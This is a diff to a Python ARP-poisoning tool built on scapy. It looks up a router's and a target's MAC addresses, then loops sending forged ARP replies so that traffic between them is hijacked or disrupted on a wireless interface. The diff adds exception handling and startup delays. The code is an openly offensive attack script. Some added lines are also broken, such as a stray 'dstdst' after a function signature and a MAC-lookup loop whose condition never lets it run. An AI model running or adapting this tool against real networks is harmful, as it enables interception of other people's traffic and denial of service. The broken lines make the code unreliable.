@@ -38,34 +38,41 @@ class ARP_Poison():
 
     
     @staticmethod
-    def _get_macs(router_ip, target_ip, iface, verbose=True):
+    def _get_macs(router_ip, target_ip, iface, verbose=True):dstdst
         """This module will be responsible for pulling macs from ips"""
 
         mac_node    = False
         mac_router  = False
 
         broadcast = "ff:ff:ff:ff:ff:ff"
-
-        pkt_to_router = Ether(dst=broadcast) / ARP(dst=broadcast, pdst=str(router_ip))
-        pkt_to_node   = Ether(dst=broadcast) / ARP(dst=broadcast, pdst=str(target_ip))
-
         
-        while not mac_node and mac_router:
+
+        try:
+
+            pkt_to_router = Ether(dst=broadcast) / ARP(pdst=str(router_ip))
+            pkt_to_node   = Ether(dst=broadcast) / ARP(pdst=str(target_ip))
+
             
-            if not mac_node:
-                response = srp(pkt_to_node, iface=iface)[0]
-                for sent,recv in response: mac_node = recv.hwsrc
-            
-            if not mac_router:
-                response = srp(pkt_to_router, iface=iface)[0]
-                for sent,recv in response: mac_router = recv.hwsrc
+            while not mac_node and mac_router:
+                
+                if not mac_node:
+                    response = srp(pkt_to_node, iface=iface)[0]
+                    for sent,recv in response: mac_node = recv.hwsrc
+                
+                if not mac_router:
+                    response = srp(pkt_to_router, iface=iface)[0]
+                    for sent,recv in response: mac_router = recv.hwsrc
 
 
-            time.sleep(2)
+                time.sleep(2)
+            
+            if verbose: console.print(f"{mac_router} - {mac_node}")
+
+            return mac_router, mac_node
         
-        if verbose: console.print(f"{mac_router} - {mac_node}")
 
-        return mac_router, mac_node
+        except Exception as e:
+            console.print(f"[bold red]EE: {e}")
             
 
 
@@ -128,35 +135,40 @@ class ARP_Poison():
         c1 = "bold yellow"
         c2 = "bold green"
         c3 = "bold red"
-
-        router_mac, target_mac = ARP_Poison._get_macs(router_ip=router_ip, target_ip=target_ip, iface=iface)
-
-
-        random_ip = ARP_Poison._get_random_ip(verbose=True)
-        random_mac = str(RandMAC)
-
-
-        frame_to_node   = Ether(src=random_mac, dst=target_mac) / ARP(psrc=router_ip, pdst=target_ip, hwsrc=random_mac, hwdst=target_mac)
-        frame_to_router = Ether(src=random_mac, dst=router_mac) / ARP(psrc=target_ip, pdst=router_ip, hwsrc=random_mac, hwdst=router_mac)
         
+        try:
 
-        if verbose: console.print(f"[{c3}][*] Poisoning:[{c1}] {target_ip}[{c3}] <--->[{c1}] {target_mac}")
-    
+            router_mac, target_mac = ARP_Poison._get_macs(router_ip=router_ip, target_ip=target_ip, iface=iface)
+
+
+            random_ip = ARP_Poison._get_random_ip(verbose=True)
+            random_mac = str(RandMAC)
+
+
+            frame_to_node   = Ether(src=random_mac, dst=target_mac) / ARP(psrc=router_ip, pdst=target_ip, hwsrc=random_mac, hwdst=target_mac)
+            frame_to_router = Ether(src=random_mac, dst=router_mac) / ARP(psrc=target_ip, pdst=router_ip, hwsrc=random_mac, hwdst=router_mac)
+            
+
+            if verbose: console.print(f"[{c3}][*] Poisoning:[{c1}] {target_ip}[{c3}] <--->[{c1}] {target_mac}")
         
-        while cls.attack_poison:
+            
+            while cls.attack_poison:
 
 
-            if cls.attack_poison:
-                send(frame_to_node,   count=25, verbose=verbose)
-                send(frame_to_router, count=25, verbose=verbose)
+                if cls.attack_poison:
+                    send(frame_to_node,   count=25, verbose=verbose)
+                    send(frame_to_router, count=25, verbose=verbose)
 
 
-            if verbose: console.print(f"sent 25 packets", style="bold red")
-            time.sleep(delay)
+                if verbose: console.print(f"sent 25 packets", style="bold red")
+                time.sleep(delay)
+            
+
+            tell = True
+            if tell: console.print(f"[{c2}][+] Revive:[{c1}] {target_ip}")
         
-
-        tell = True
-        if tell: console.print(f"[{c2}][+] Revive:[{c1}] {target_ip}")
+        except Exception as e:
+            console.print(f"[bold red]Exception Error:[bold yellow] {e}")
 
 
     
@@ -167,8 +179,6 @@ class ARP_Poison():
         
         cls.attack_poison = True
 
-        console.print(Connection_Handler.nodes)
-
 
         while cls.attack_poison:
             
@@ -176,7 +186,7 @@ class ARP_Poison():
             console.print(nodes)
             
             for key, value in nodes.items():
-                console.print(key, value)
+
 
                 target_ip = value["target_ip"]
                 
@@ -203,7 +213,8 @@ class Yoda_Controller():
 if __name__ == "__main__":
     from nsm_modules.nsm_main import Main; import threading
     threading.Thread(target=Main.run(), daemon=True).start()
-    ARP_Poison.main(router_ip="192.168.1.1", iface="wlan0")
+    time.sleep(2); console.print("i went")
+    time.sleep(10); ARP_Poison.main(router_ip="192.168.1.1", iface="wlan0")
 
 
 
